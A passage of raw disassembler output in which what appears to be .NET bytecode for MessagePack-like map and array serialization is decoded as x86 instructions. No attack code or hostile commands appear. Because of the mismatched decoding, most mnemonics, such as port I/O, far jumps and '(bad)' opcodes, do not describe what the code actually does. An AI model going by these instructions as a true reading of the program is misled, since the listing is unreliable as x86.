  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4046f2:	ed                   	in     (%dx),%eax
  4046f3:	00 00                	add    %al,(%eax)
  4046f5:	0a 39                	or     (%ecx),%bh
  4046f7:	07                   	pop    %es
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	00 06                	add    %al,(%esi)
  4046fc:	0b dd                	or     %ebp,%ebx
  4046fe:	1c 00                	sbb    $0x0,%al
  404700:	00 00                	add    %al,(%eax)
  404702:	12 03                	adc    (%ebx),%al
  404704:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  40470a:	d1 dd                	rcr    $1,%ebp
  40470c:	0e                   	push   %cs
  40470d:	00 00                	add    %al,(%eax)
  40470f:	00 12                	add    %dl,(%edx)
  404711:	03 fe                	add    %esi,%edi
  404713:	16                   	push   %ss
  404714:	04 00                	add    $0x0,%al
  404716:	00 1b                	add    %bl,(%ebx)
  404718:	6f                   	outsl  %ds:(%esi),(%dx)
  404719:	33 00                	xor    (%eax),%eax
  40471b:	00 0a                	add    %cl,(%edx)
  40471d:	dc 07                	faddl  (%edi)
  40471f:	2a 01                	sub    (%ecx),%al
  404721:	10 00                	adc    %al,(%eax)
  404723:	00 02                	add    %al,(%edx)
  404725:	00 17                	add    %dl,(%edi)
  404727:	00 39                	add    %bh,(%ecx)
  404729:	50                   	push   %eax
  40472a:	00 0e                	add    %cl,(%esi)
  40472c:	00 00                	add    %al,(%eax)
  40472e:	00 00                	add    %al,(%eax)
  404730:	13 30                	adc    (%eax),%esi
  404732:	02 00                	add    (%eax),%al
  404734:	1e                   	push   %ds
  404735:	00 00                	add    %al,(%eax)
  404737:	00 01                	add    %al,(%ecx)
  404739:	00 00                	add    %al,(%eax)
  40473b:	11 02                	adc    %eax,(%edx)
  40473d:	03 28                	add    (%eax),%ebp
  40473f:	6d                   	insl   (%dx),%es:(%edi)
  404740:	00 00                	add    %al,(%eax)
  404742:	06                   	push   %es
  404743:	0a 06                	or     (%esi),%al
  404745:	15 40 02 00 00       	adc    $0x240,%eax
  40474a:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  40474d:	02 7b 38             	add    0x38(%ebx),%bh
  404750:	00 00                	add    %al,(%eax)
  404752:	04 06                	add    $0x6,%al
  404754:	6f                   	outsl  %ds:(%esi),(%dx)
  404755:	ea 00 00 0a 2a 00 00 	ljmp   $0x0,$0x2a0a0000
  40475c:	13 30                	adc    (%eax),%esi
  40475e:	04 00                	add    $0x0,%al
  404760:	bc 00 00 00 1f       	mov    $0x1f000000,%esp
  404765:	00 00                	add    %al,(%eax)
  404767:	11 02                	adc    %eax,(%edx)
  404769:	7b 38                	jnp    0x4047a3
  40476b:	00 00                	add    %al,(%eax)
  40476d:	04 6f                	add    $0x6f,%al
  40476f:	eb 00                	jmp    0x404771
  404771:	00 0a                	add    %cl,(%edx)
  404773:	0a 06                	or     (%esi),%al
  404775:	1f                   	pop    %ds
  404776:	0f 3d                	(bad)
  404778:	16                   	push   %ss
  404779:	00 00                	add    %al,(%eax)
  40477b:	00 20                	add    %ah,(%eax)
  40477d:	80 00 00             	addb   $0x0,(%eax)
  404780:	00 06                	add    %al,(%esi)
  404782:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  404785:	0b 03                	or     (%ebx),%eax
  404787:	07                   	pop    %es
  404788:	6f                   	outsl  %ds:(%esi),(%dx)
  404789:	ee                   	out    %al,(%dx)
  40478a:	00 00                	add    %al,(%eax)
  40478c:	0a 38                	or     (%eax),%bh
  40478e:	59                   	pop    %ecx
  40478f:	00 00                	add    %al,(%eax)
  404791:	00 06                	add    %al,(%esi)
  404793:	20 ff                	and    %bh,%bh
  404795:	ff 00                	incl   (%eax)
  404797:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40479d:	20 de                	and    %bl,%dh
  40479f:	00 00                	add    %al,(%eax)
  4047a1:	00 0b                	add    %cl,(%ebx)
  4047a3:	03 07                	add    (%edi),%eax
  4047a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a6:	ee                   	out    %al,(%dx)
  4047a7:	00 00                	add    %al,(%eax)
  4047a9:	0a 06                	or     (%esi),%al
  4047ab:	68 28 ef 00 00       	push   $0xef28
  4047b0:	0a 28                	or     (%eax),%ch
  4047b2:	58                   	pop    %eax
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	06                   	push   %es
  4047b6:	0c 03                	or     $0x3,%al
  4047b8:	08 16                	or     %dl,(%esi)
  4047ba:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047c0:	00 0a                	add    %cl,(%edx)
  4047c2:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  4047c5:	00 00                	add    %al,(%eax)
  4047c7:	20 df                	and    %bl,%bh
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	00 0b                	add    %cl,(%ebx)
  4047cd:	03 07                	add    (%edi),%eax
  4047cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4047d0:	ee                   	out    %al,(%dx)
  4047d1:	00 00                	add    %al,(%eax)
  4047d3:	0a 06                	or     (%esi),%al
  4047d5:	28 4a 00             	sub    %cl,0x0(%edx)
  4047d8:	00 0a                	add    %cl,(%edx)
  4047da:	28 58 00             	sub    %bl,0x0(%eax)
  4047dd:	00 06                	add    %al,(%esi)
  4047df:	0c 03                	or     $0x3,%al
  4047e1:	08 16                	or     %dl,(%esi)
  4047e3:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4047e9:	00 0a                	add    %cl,(%edx)
  4047eb:	16                   	push   %ss
  4047ec:	0d 38 2d 00 00       	or     $0x2d38,%eax
  4047f1:	00 03                	add    %al,(%ebx)
  4047f3:	02 7b 38             	add    0x38(%ebx),%bh
  4047f6:	00 00                	add    %al,(%eax)
  4047f8:	04 09                	add    $0x9,%al
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	ea 00 00 0a 7b 33 00 	ljmp   $0x33,$0x7b0a0000
  404802:	00 04 28             	add    %al,(%eax,%ebp,1)
  404805:	9a 00 00 06 02 7b 38 	lcall  $0x387b,$0x2060000
  40480c:	00 00                	add    %al,(%eax)
  40480e:	04 09                	add    $0x9,%al
  404810:	6f                   	outsl  %ds:(%esi),(%dx)
  404811:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  404818:	00 00                	add    %al,(%eax)
  40481a:	06                   	push   %es
  40481b:	09 17                	or     %edx,(%edi)
  40481d:	58                   	pop    %eax
  40481e:	0d 09 06 32 cf       	or     $0xcf320609,%eax
  404823:	2a 13                	sub    (%ebx),%dl
  404825:	30 04 00             	xor    %al,(%eax,%eax,1)
  404828:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 1f                	add    %bl,(%edi)
  40482d:	00 00                	add    %al,(%eax)
  40482f:	11 02                	adc    %eax,(%edx)
  404831:	7b 38                	jnp    0x40486b
  404833:	00 00                	add    %al,(%eax)
  404835:	04 6f                	add    $0x6f,%al
  404837:	eb 00                	jmp    0x404839
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	0a 06                	or     (%esi),%al
  40483d:	1f                   	pop    %ds
  40483e:	0f 3d                	(bad)
  404840:	16                   	push   %ss
  404841:	00 00                	add    %al,(%eax)
  404843:	00 20                	add    %ah,(%eax)
  404845:	90                   	nop
  404846:	00 00                	add    %al,(%eax)
  404848:	00 06                	add    %al,(%esi)
  40484a:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  40484d:	0b 03                	or     (%ebx),%eax
  40484f:	07                   	pop    %es
  404850:	6f                   	outsl  %ds:(%esi),(%dx)
  404851:	ee                   	out    %al,(%dx)
  404852:	00 00                	add    %al,(%eax)
  404854:	0a 38                	or     (%eax),%bh
  404856:	59                   	pop    %ecx
  404857:	00 00                	add    %al,(%eax)
  404859:	00 06                	add    %al,(%esi)
  40485b:	20 ff                	and    %bh,%bh
  40485d:	ff 00                	incl   (%eax)
  40485f:	00 3d 2a 00 00 00    	add    %bh,0x2a
  404865:	20 dc                	and    %bl,%ah
  404867:	00 00                	add    %al,(%eax)
  404869:	00 0b                	add    %cl,(%ebx)
  40486b:	03 07                	add    (%edi),%eax
  40486d:	6f                   	outsl  %ds:(%esi),(%dx)
  40486e:	ee                   	out    %al,(%dx)
  40486f:	00 00                	add    %al,(%eax)
  404871:	0a 06                	or     (%esi),%al
  404873:	68 28 ef 00 00       	push   $0xef28
  404878:	0a 28                	or     (%eax),%ch
  40487a:	58                   	pop    %eax
  40487b:	00 00                	add    %al,(%eax)
  40487d:	06                   	push   %es
  40487e:	0c 03                	or     $0x3,%al
  404880:	08 16                	or     %dl,(%esi)
  404882:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  404888:	00 0a                	add    %cl,(%edx)
  40488a:	38 24 00             	cmp    %ah,(%eax,%eax,1)
  40488d:	00 00                	add    %al,(%eax)
  40488f:	20 dd                	and    %bl,%ch
  404891:	00 00                	add    %al,(%eax)
  404893:	00 0b                	add    %cl,(%ebx)
  404895:	03 07                	add    (%edi),%eax
  404897:	6f                   	outsl  %ds:(%esi),(%dx)
  404898:	ee                   	out    %al,(%dx)
  404899:	00 00                	add    %al,(%eax)
  40489b:	0a 06                	or     (%esi),%al
  40489d:	28 4a 00             	sub    %cl,0x0(%edx)
  4048a0:	00 0a                	add    %cl,(%edx)
  4048a2:	28 58 00             	sub    %bl,0x0(%eax)
  4048a5:	00 06                	add    %al,(%esi)
  4048a7:	0c 03                	or     $0x3,%al
  4048a9:	08 16                	or     %dl,(%esi)
  4048ab:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  4048b1:	00 0a                	add    %cl,(%edx)
  4048b3:	16                   	push   %ss
  4048b4:	0d 38 16 00 00       	or     $0x1638,%eax
  4048b9:	00 02                	add    %al,(%edx)
  4048bb:	7b 38                	jnp    0x4048f5
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	04 09                	add    $0x9,%al
  4048c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4048c2:	ea 00 00 0a 03 6f 8a 	ljmp   $0x8a6f,$0x30a0000
  4048c9:	00 00                	add    %al,(%eax)
  4048cb:	06                   	push   %es
  4048cc:	09 17                	or     %edx,(%edi)
  4048ce:	58                   	pop    %eax
  4048cf:	0d 09 06 32 e6       	or     $0xe6320609,%eax
  4048d4:	2a 00                	sub    (%eax),%al
  4048d6:	00 00                	add    %al,(%eax)
  4048d8:	13 30                	adc    (%eax),%esi
  4048da:	02 00                	add    (%eax),%al
  4048dc:	99                   	cltd
  4048dd:	00 00                	add    %al,(%eax)
  4048df:	00 20                	add    %ah,(%eax)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	11 02                	adc    %eax,(%edx)
  4048e5:	7b 36                	jnp    0x40491d
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	04 0a                	add    $0xa,%al
  4048eb:	06                   	push   %es
  4048ec:	1a 59 45             	sbb    0x45(%ecx),%bl
  4048ef:	07                   	pop    %es
  4048f0:	00 00                	add    %al,(%eax)
  4048f2:	00 22                	add    %ah,(%edx)
  4048f4:	00 00                	add    %al,(%eax)
  4048f6:	00 05 00 00 00 16    	add    %al,0x16000000
  4048fc:	00 00                	add    %al,(%eax)
  4048fe:	00 6b 00             	add    %ch,0x0(%ebx)
  404901:	00 00                	add    %al,(%eax)
  404903:	38 00                	cmp    %al,(%eax)
  404905:	00 00                	add    %al,(%eax)
  404907:	49                   	dec    %ecx
  404908:	00 00                	add    %al,(%eax)
  40490a:	00 5a 00             	add    %bl,0x0(%edx)
  40490d:	00 00                	add    %al,(%eax)
  40490f:	38 66 00             	cmp    %ah,0x0(%esi)
  404912:	00 00                	add    %al,(%eax)
  404914:	02 7b 35             	add    0x35(%ebx),%bh
  404917:	00 00                	add    %al,(%eax)
  404919:	04 a5                	add    $0xa5,%al
  40491b:	68 00 00 01 28       	push   $0x28010000
  404920:	f0 00 00             	lock add %al,(%eax)
  404923:	0a 2a                	or     (%edx),%ch
  404925:	02 7b 35             	add    0x35(%ebx),%bh
  404928:	00 00                	add    %al,(%eax)
  40492a:	04 a5                	add    $0xa5,%al
  40492c:	95                   	xchg   %eax,%ebp
  40492d:	00 00                	add    %al,(%eax)
  40492f:	01 2a                	add    %ebp,(%edx)
  404931:	02 7b 35             	add    0x35(%ebx),%bh
  404934:	00 00                	add    %al,(%eax)
  404936:	04 6f                	add    $0x6f,%al
  404938:	38 00                	cmp    %al,(%eax)
  40493a:	00 0a                	add    %cl,(%edx)
  40493c:	6f                   	outsl  %ds:(%esi),(%dx)
  40493d:	f1                   	int1
  40493e:	00 00                	add    %al,(%eax)
  404940:	0a 28                	or     (%eax),%ch
  404942:	f2 00 00             	repnz add %al,(%eax)
  404945:	0a 2a                	or     (%edx),%ch
  404947:	02 7b 35             	add    0x35(%ebx),%bh
  40494a:	00 00                	add    %al,(%eax)
  40494c:	04 a5                	add    $0xa5,%al
  40494e:	96                   	xchg   %eax,%esi
  40494f:	00 00                	add    %al,(%eax)
  404951:	01 28                	add    %ebp,(%eax)
  404953:	f3 00 00             	repz add %al,(%eax)
  404956:	0a 2a                	or     (%edx),%ch
  404958:	02 7b 35             	add    0x35(%ebx),%bh
  40495b:	00 00                	add    %al,(%eax)
  40495d:	04 a5                	add    $0xa5,%al
  40495f:	97                   	xchg   %eax,%edi
  404960:	00 00                	add    %al,(%eax)
  404962:	01 28                	add    %ebp,(%eax)
  404964:	f4                   	hlt
  404965:	00 00                	add    %al,(%eax)
  404967:	0a 2a                	or     (%edx),%ch
  404969:	02 7b 35             	add    0x35(%ebx),%bh
  40496c:	00 00                	add    %al,(%eax)
  40496e:	04 a5                	add    $0xa5,%al
  404970:	6b 00 00             	imul   $0x0,(%eax),%eax
  404973:	01 28                	add    %ebp,(%eax)
  404975:	f5                   	cmc
  404976:	00 00                	add    %al,(%eax)
  404978:	0a 2a                	or     (%edx),%ch
  40497a:	16                   	push   %ss
  40497b:	6a 2a                	push   $0x2a
  40497d:	00 00                	add    %al,(%eax)
  40497f:	00 13                	add    %dl,(%ebx)
  404981:	30 02                	xor    %al,(%edx)
  404983:	00 99 00 00 00 20    	add    %bl,0x20000000(%ecx)
  404989:	00 00                	add    %al,(%eax)
  40498b:	11 02                	adc    %eax,(%edx)
  40498d:	7b 36                	jnp    0x4049c5
  40498f:	00 00                	add    %al,(%eax)
  404991:	04 0a                	add    $0xa,%al
  404993:	06                   	push   %es
  404994:	1a 59 45             	sbb    0x45(%ecx),%bl
  404997:	07                   	pop    %es
  404998:	00 00                	add    %al,(%eax)
  40499a:	00 22                	add    %ah,(%edx)
  40499c:	00 00                	add    %al,(%eax)
  40499e:	00 05 00 00 00 11    	add    %al,0x11000000
  4049a4:	00 00                	add    %al,(%eax)
  4049a6:	00 6b 00             	add    %ch,0x0(%ebx)
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	38 00                	cmp    %al,(%eax)
  4049ad:	00 00                	add    %al,(%eax)
  4049af:	49                   	dec    %ecx
  4049b0:	00 00                	add    %al,(%eax)
  4049b2:	00 5a 00             	add    %bl,0x0(%edx)
  4049b5:	00 00                	add    %al,(%eax)
  4049b7:	38 66 00             	cmp    %ah,0x0(%esi)
  4049ba:	00 00                	add    %al,(%eax)
  4049bc:	02 7b 35             	add    0x35(%ebx),%bh
  4049bf:	00 00                	add    %al,(%eax)
  4049c1:	04 a5                	add    $0xa5,%al
  4049c3:	68 00 00 01 2a       	push   $0x2a010000
  4049c8:	02 7b 35             	add    0x35(%ebx),%bh
  4049cb:	00 00                	add    %al,(%eax)
  4049cd:	04 a5                	add    $0xa5,%al
  4049cf:	68 00 00 01 28       	push   $0x28010000
  4049d4:	f6 00 00             	testb  $0x0,(%eax)
  4049d7:	0a 2a                	or     (%edx),%ch
  4049d9:	02 7b 35             	add    0x35(%ebx),%bh
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	04 6f                	add    $0x6f,%al
  4049e0:	38 00                	cmp    %al,(%eax)
  4049e2:	00 0a                	add    %cl,(%edx)
  4049e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e5:	f1                   	int1
  4049e6:	00 00                	add    %al,(%eax)
  4049e8:	0a 28                	or     (%eax),%ch
  4049ea:	f7 00 00 0a 2a 02    	testl  $0x22a0a00,(%eax)
  4049f0:	7b 35                	jnp    0x404a27
  4049f2:	00 00                	add    %al,(%eax)
  4049f4:	04 a5                	add    $0xa5,%al
  4049f6:	96                   	xchg   %eax,%esi
  4049f7:	00 00                	add    %al,(%eax)
  4049f9:	01 28                	add    %ebp,(%eax)
  4049fb:	f8                   	clc
  4049fc:	00 00                	add    %al,(%eax)
  4049fe:	0a 2a                	or     (%edx),%ch
  404a00:	02 7b 35             	add    0x35(%ebx),%bh
  404a03:	00 00                	add    %al,(%eax)
  404a05:	04 a5                	add    $0xa5,%al
  404a07:	97                   	xchg   %eax,%edi
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	01 28                	add    %ebp,(%eax)
  404a0c:	f9                   	stc
  404a0d:	00 00                	add    %al,(%eax)
  404a0f:	0a 2a                	or     (%edx),%ch
  404a11:	02 7b 35             	add    0x35(%ebx),%bh
  404a14:	00 00                	add    %al,(%eax)
  404a16:	04 a5                	add    $0xa5,%al
  404a18:	6b 00 00             	imul   $0x0,(%eax),%eax
  404a1b:	01 28                	add    %ebp,(%eax)
  404a1d:	fa                   	cli
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 2a                	or     (%edx),%ch
  404a22:	16                   	push   %ss
  404a23:	6a 2a                	push   $0x2a
  404a25:	00 00                	add    %al,(%eax)
  404a27:	00 13                	add    %dl,(%ebx)
  404a29:	30 02                	xor    %al,(%edx)
  404a2b:	00 87 00 00 00 20    	add    %al,0x20000000(%edi)
  404a31:	00 00                	add    %al,(%eax)
  404a33:	11 02                	adc    %eax,(%edx)
  404a35:	7b 36                	jnp    0x404a6d
  404a37:	00 00                	add    %al,(%eax)
  404a39:	04 0a                	add    $0xa,%al
  404a3b:	06                   	push   %es
  404a3c:	1a 59 45             	sbb    0x45(%ecx),%bl
  404a3f:	07                   	pop    %es
  404a40:	00 00                	add    %al,(%eax)
  404a42:	00 16                	add    %dl,(%esi)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 05 00 00 00 52    	add    %al,0x52000000
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 52 00             	add    %dl,0x0(%edx)
  404a51:	00 00                	add    %al,(%eax)
  404a53:	27                   	daa
  404a54:	00 00                	add    %al,(%eax)
  404a56:	00 33                	add    %dh,(%ebx)
  404a58:	00 00                	add    %al,(%eax)
  404a5a:	00 40 00             	add    %al,0x0(%eax)
  404a5d:	00 00                	add    %al,(%eax)
  404a5f:	38 4d 00             	cmp    %cl,0x0(%ebp)
  404a62:	00 00                	add    %al,(%eax)
  404a64:	02 7b 35             	add    0x35(%ebx),%bh
  404a67:	00 00                	add    %al,(%eax)
  404a69:	04 a5                	add    $0xa5,%al
  404a6b:	68 00 00 01 28       	push   $0x28010000
  404a70:	fb                   	sti
  404a71:	00 00                	add    %al,(%eax)
  404a73:	0a 2a                	or     (%edx),%ch
  404a75:	02 7b 35             	add    0x35(%ebx),%bh
  404a78:	00 00                	add    %al,(%eax)
  404a7a:	04 74                	add    $0x74,%al
  404a7c:	38 00                	cmp    %al,(%eax)
  404a7e:	00 01                	add    %al,(%ecx)
  404a80:	28 fc                	sub    %bh,%ah
  404a82:	00 00                	add    %al,(%eax)
  404a84:	0a 2a                	or     (%edx),%ch
  404a86:	02 7b 35             	add    0x35(%ebx),%bh
  404a89:	00 00                	add    %al,(%eax)
  404a8b:	04 a5                	add    $0xa5,%al
  404a8d:	96                   	xchg   %eax,%esi
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	01 2a                	add    %ebp,(%edx)
  404a92:	02 7b 35             	add    0x35(%ebx),%bh
  404a95:	00 00                	add    %al,(%eax)
  404a97:	04 a5                	add    $0xa5,%al
  404a99:	97                   	xchg   %eax,%edi
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  404aa0:	7b 35                	jnp    0x404ad7
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	04 a5                	add    $0xa5,%al
  404aa6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404aa9:	01 28                	add    %ebp,(%eax)
  404aab:	fa                   	cli
  404aac:	00 00                	add    %al,(%eax)
  404aae:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  404aba:	2a 00                	sub    (%eax),%al
  404abc:	13 30                	adc    (%eax),%esi
  404abe:	02 00                	add    (%eax),%al
  404ac0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	00 21                	add    %ah,(%ecx)
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	11 02                	adc    %eax,(%edx)
  404ac9:	7b 36                	jnp    0x404b01
  404acb:	00 00                	add    %al,(%eax)
  404acd:	04 0a                	add    $0xa,%al
  404acf:	06                   	push   %es
  404ad0:	1a 59 45             	sbb    0x45(%ecx),%bl
  404ad3:	08 00                	or     %al,(%eax)
  404ad5:	00 00                	add    %al,(%eax)
  404ad7:	16                   	push   %ss
  404ad8:	00 00                	add    %al,(%eax)
  404ada:	00 05 00 00 00 6e    	add    %al,0x6e000000
  404ae0:	00 00                	add    %al,(%eax)
  404ae2:	00 6e 00             	add    %ch,0x0(%esi)
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	27                   	daa
  404ae8:	00 00                	add    %al,(%eax)
  404aea:	00 38                	add    %bh,(%eax)
  404aec:	00 00                	add    %al,(%eax)
  404aee:	00 49 00             	add    %cl,0x0(%ecx)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	62 00                	bound  %eax,(%eax)
  404af5:	00 00                	add    %al,(%eax)
  404af7:	38 69 00             	cmp    %ch,0x0(%ecx)
  404afa:	00 00                	add    %al,(%eax)
  404afc:	02 7b 35             	add    0x35(%ebx),%bh
  404aff:	00 00                	add    %al,(%eax)
  404b01:	04 a5                	add    $0xa5,%al
  404b03:	68 00 00 01 28       	push   $0x28010000
  404b08:	e7 00                	out    %eax,$0x0
  404b0a:	00 0a                	add    %cl,(%edx)
  404b0c:	2a 02                	sub    (%edx),%al
  404b0e:	7b 35                	jnp    0x404b45
  404b10:	00 00                	add    %al,(%eax)
  404b12:	04 6f                	add    $0x6f,%al
  404b14:	38 00                	cmp    %al,(%eax)
  404b16:	00 0a                	add    %cl,(%edx)
  404b18:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  404b1c:	06                   	push   %es
  404b1d:	2a 02                	sub    (%edx),%al
  404b1f:	7b 35                	jnp    0x404b56
  404b21:	00 00                	add    %al,(%eax)
  404b23:	04 a5                	add    $0xa5,%al
  404b25:	96                   	xchg   %eax,%esi
  404b26:	00 00                	add    %al,(%eax)
  404b28:	01 28                	add    %ebp,(%eax)
  404b2a:	e8 00 00 0a 2a       	call   0x2a4a4b2f
  404b2f:	02 7b 35             	add    0x35(%ebx),%bh
  404b32:	00 00                	add    %al,(%eax)
  404b34:	04 a5                	add    $0xa5,%al
  404b36:	97                   	xchg   %eax,%edi
  404b37:	00 00                	add    %al,(%eax)
  404b39:	01 28                	add    %ebp,(%eax)
  404b3b:	fd                   	std
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 2a                	or     (%edx),%ch
  404b40:	02 7b 35             	add    0x35(%ebx),%bh
  404b43:	00 00                	add    %al,(%eax)
  404b45:	04 a5                	add    $0xa5,%al
  404b47:	6b 00 00             	imul   $0x0,(%eax),%eax
  404b4a:	01 0b                	add    %ecx,(%ebx)
  404b4c:	12 01                	adc    (%ecx),%al
  404b4e:	28 fe                	sub    %bh,%dh
  404b50:	00 00                	add    %al,(%eax)
  404b52:	0a 28                	or     (%eax),%ch
  404b54:	e7 00                	out    %eax,$0x0
  404b56:	00 0a                	add    %cl,(%edx)
  404b58:	2a 02                	sub    (%edx),%al
  404b5a:	7b 35                	jnp    0x404b91
  404b5c:	00 00                	add    %al,(%eax)
  404b5e:	04 74                	add    $0x74,%al
  404b60:	02 00                	add    (%eax),%al
  404b62:	00 1b                	add    %bl,(%ebx)
  404b64:	2a 16                	sub    (%esi),%dl
  404b66:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404b6a:	01 2a                	add    %ebp,(%edx)
  404b6c:	13 30                	adc    (%eax),%esi
  404b6e:	04 00                	add    $0x0,%al
  404b70:	4b                   	dec    %ebx
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 22                	add    %ah,(%edx)
  404b75:	00 00                	add    %al,(%eax)
  404b77:	11 03                	adc    %eax,(%ebx)
  404b79:	28 6a 00             	sub    %ch,0x0(%edx)
  404b7c:	00 0a                	add    %cl,(%edx)
  404b7e:	39 3e                	cmp    %edi,(%esi)
  404b80:	00 00                	add    %al,(%eax)
  404b82:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  404b85:	03 19                	add    (%ecx),%ebx
  404b87:	17                   	pop    %ss
  404b88:	17                   	pop    %ss
  404b89:	73 ff                	jae    0x404b8a
  404b8b:	00 00                	add    %al,(%eax)
  404b8d:	0a 0b                	or     (%ebx),%cl
  404b8f:	07                   	pop    %es
  404b90:	6f                   	outsl  %ds:(%esi),(%dx)
  404b91:	e2 00                	loop   0x404b93
  404b93:	00 0a                	add    %cl,(%edx)
  404b95:	d4 8d                	aam    $0x8d
  404b97:	44                   	inc    %esp
  404b98:	00 00                	add    %al,(%eax)
  404b9a:	01 0a                	add    %ecx,(%edx)
  404b9c:	07                   	pop    %es
  404b9d:	06                   	push   %es
  404b9e:	16                   	push   %ss
  404b9f:	07                   	pop    %es
  404ba0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ba1:	e2 00                	loop   0x404ba3
  404ba3:	00 0a                	add    %cl,(%edx)
  404ba5:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  404bac:	07                   	pop    %es
  404bad:	6f                   	outsl  %ds:(%esi),(%dx)
  404bae:	9f                   	lahf
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	0a 07                	or     (%edi),%al
  404bb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb4:	40                   	inc    %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 02                	or     (%edx),%al
  404bb9:	06                   	push   %es
  404bba:	28 79 00             	sub    %bh,0x0(%ecx)
  404bbd:	00 06                	add    %al,(%esi)
  404bbf:	17                   	pop    %ss
  404bc0:	2a 16                	sub    (%esi),%dl
  404bc2:	2a 00                	sub    (%eax),%al
  404bc4:	13 30                	adc    (%eax),%esi
  404bc6:	05 00 40 00 00       	add    $0x4000,%eax
  404bcb:	00 00                	add    %al,(%eax)
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 02                	add    %al,(%edx)
  404bd1:	7b 35                	jnp    0x404c08
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	04 39                	add    $0x39,%al
  404bd7:	33 00                	xor    (%eax),%eax
  404bd9:	00 00                	add    %al,(%eax)
  404bdb:	03 1c 73             	add    (%ebx,%esi,2),%ebx
  404bde:	6c                   	insb   (%dx),%es:(%edi)
  404bdf:	00 00                	add    %al,(%eax)
  404be1:	0a 25 02 7b 35 00    	or     0x357b02,%ah
  404be7:	00 04 74             	add    %al,(%esp,%esi,2)
  404bea:	02 00                	add    (%eax),%al
  404bec:	00 1b                	add    %bl,(%ebx)
  404bee:	16                   	push   %ss
  404bef:	02 7b 35             	add    0x35(%ebx),%bh
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	04 74                	add    $0x74,%al
  404bf6:	02 00                	add    (%eax),%al
  404bf8:	00 1b                	add    %bl,(%ebx)
  404bfa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404bfd:	4c                   	dec    %esp
  404bfe:	00 00                	add    %al,(%eax)
  404c00:	0a 25 6f 9f 00 00    	or     0x9f6f,%ah
  404c06:	0a 6f 40             	or     0x40(%edi),%ch
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	0a 17                	or     (%edi),%dl
  404c0d:	2a 16                	sub    (%esi),%dl
  404c0f:	2a 13                	sub    (%ebx),%dl
  404c11:	30 04 00             	xor    %al,(%eax,%eax,1)
  404c14:	af                   	scas   %es:(%edi),%eax
  404c15:	00 00                	add    %al,(%eax)
  404c17:	00 23                	add    %ah,(%ebx)
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	11 02                	adc    %eax,(%edx)
  404c1d:	0a 03                	or     (%ebx),%al
  404c1f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c20:	f1                   	int1
  404c21:	00 00                	add    %al,(%eax)
  404c23:	0a 19                	or     (%ecx),%bl
  404c25:	8d 39                	lea    (%ecx),%edi
  404c27:	00 00                	add    %al,(%eax)
  404c29:	01 25 d0 47 00 00    	add    %esp,0x47d0
  404c2f:	04 28                	add    $0x28,%al
  404c31:	e4 00                	in     $0x0,%al
  404c33:	00 0a                	add    %cl,(%edx)
  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
